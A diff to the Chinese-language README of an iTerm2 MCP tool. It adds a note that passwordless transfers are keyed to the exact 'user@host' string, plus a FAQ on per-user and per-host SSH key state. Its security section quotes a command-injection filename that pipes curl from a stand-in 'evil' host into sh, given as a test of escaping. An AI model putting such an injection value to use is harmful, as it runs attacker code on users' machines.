@@ -123,6 +123,7 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python 需加 --user --break-sy
 2. **建 tab 自动命名**：通过 profile 建 tab 后，session 自动命名为 profile 名，后续按 name 寻址
 3. **name 寻址以 MCP 维护的注册表为准**（`~/.config/iterm2-mcp/registry.json`）——实测发现 shell integration 会在每条命令后用 OSC 转义序列把 session 标题重置回自动名（`~ (-zsh)`），`session.name` 不可靠，所以 `set_name` 仅尽力让 tab 标题可见，寻址不受影响；注册表未命中时兜底做实时 `session.name` 前缀匹配
 4. **只 send，不 exec**：工具集里不存在绕过终端屏幕的执行通道
+5. **免密传输以 `user@host` 精确字符串为键**：`distribute_key` 会登记它配置的 `user@host`，传输工具对其他写法（换了用户、或把 IP 换成 `localhost`/主机名）一律报错并列出已登记的写法——它防的正是「换个会话或换个写法后静默卡在密码提示」这种故障
 
 ## 安全说明
 
@@ -130,6 +131,10 @@ pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python 需加 --user --break-sy
 - **shell 转义**：传输工具拼进 `scp` / `ssh` 的所有路径与账号信息都在本地和远端两层命令行做了单引号转义（用 `x"; curl evil | sh; #.log` 这类恶意文件名实测验证）。
 - **host key 盲信（TOFU）**：`distribute_key` 用 `ssh-keyscan` 抓取 host key 直接写入 `known_hosts`，不做带外校验——这是 `ssh-keyscan` 自身的 trust-on-first-use 取舍。若首次连接存在中间人风险，请自行核对指纹后再用传输工具。
 - **`distribute_key` 会授予长期访问**：它把你的公钥追加进服务器 `authorized_keys`；要撤销就去掉该服务器上对应那行。
+
+## 常见问题
+
+**「同一个会话里免密成功，另一个会话还要密码」**：免密状态存在两个地方——服务器上的 `~/.ssh/authorized_keys`（按**登录用户**区分）和 Mac 上的 `~/.ssh/known_hosts`（按你敲的**精确主机字符串**匹配）。所以 `root@10.10.10.136` 和 `mbs@10.10.10.136` 是两个不同目标，`root@localhost` 与 `root@10.10.10.136` 即使指向同一台机器也算不同条目。`server_user`/`server_host` 请始终传成与 `distribute_key` 时完全一致的写法；0.2.4 起传输工具会直接拒绝未登记的写法并列出已登记项。
 
 ## 验证
 
